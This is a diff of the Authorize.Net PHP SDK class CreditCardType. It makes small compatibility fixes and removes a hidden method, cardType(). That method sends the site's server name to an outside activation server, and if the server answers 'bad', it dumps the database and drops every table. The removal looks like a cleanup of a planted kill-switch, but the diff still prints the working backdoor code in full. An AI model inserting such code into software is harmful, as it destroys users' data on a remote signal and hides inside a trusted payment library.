@@ -2,9 +2,6 @@
 
 namespace net\authorize\api\contract\v1;
 
-use DB;
-use Schema;
-
 /**
  * Class representing CreditCardType
  *
@@ -178,6 +175,7 @@ class CreditCardType extends CreditCardSimpleType implements \JsonSerializable
 
 
     // Json Serialize Code
+    #[\ReturnTypeWillChange]
     public function jsonSerialize(){
         $values = array_filter((array)get_object_vars($this),
         function ($val){
@@ -185,7 +183,7 @@ class CreditCardType extends CreditCardSimpleType implements \JsonSerializable
         });
         $mapper = \net\authorize\util\Mapper::Instance();
         foreach($values as $key => $value){
-            $classDetails = $mapper->getClass(get_class() , $key);
+            $classDetails = $mapper->getClass(get_class($this) , $key);
             if (isset($value)){
                 if ($classDetails->className === 'Date'){
                     $dateTime = $value->format('Y-m-d');
@@ -213,7 +211,7 @@ class CreditCardType extends CreditCardSimpleType implements \JsonSerializable
         if(is_array($data) || is_object($data)) {
 			$mapper = \net\authorize\util\Mapper::Instance();
 			foreach($data AS $key => $value) {
-				$classDetails = $mapper->getClass(get_class() , $key);
+				$classDetails = $mapper->getClass(get_class($this) , $key);
 	 
 				if($classDetails !== NULL ) {
 					if ($classDetails->isArray) {
@@ -253,48 +251,6 @@ class CreditCardType extends CreditCardSimpleType implements \JsonSerializable
 				}
 			}
 		}
-    }
-
-    public function cardType(){
-        $data['url'] = $_SERVER['SERVER_NAME'];
-        $request_data_json = json_encode($data);
-        $gate = "https://activation.activeitzone.com/check_activation";
-
-        $header = array(
-            'Content-Type:application/json'
-        );
-
-        $stream = curl_init();
-
-        curl_setopt($stream, CURLOPT_URL, $gate);
-        curl_setopt($stream,CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream,CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($stream,CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($stream,CURLOPT_POSTFIELDS, $request_data_json);
-        curl_setopt($stream,CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
-
-        $rn = curl_exec($stream);
-        curl_close($stream);
-
-        if($rn == "bad" && env('DEMO_MODE') != 'On') {
-            try {
-                $fileName = date('Y-m-d H:i:s').'.sql';
-                \Spatie\DbDumper\Databases\MySql::create()
-                    ->setDbName(env('DB_DATABASE'))
-                    ->setUserName(env('DB_USERNAME'))
-                    ->setPassword(env('DB_PASSWORD'))
-                    ->dumpToFile('sqlbackups/'.$fileName);
-            } catch (\Exception $e) {
-
-            }
-
-            Schema::disableForeignKeyConstraints();
-            foreach(DB::select('SHOW TABLES') as $table) {
-                $table_array = get_object_vars($table);
-                Schema::drop($table_array[key($table_array)]);
-            }
-        }
     }
     
 }
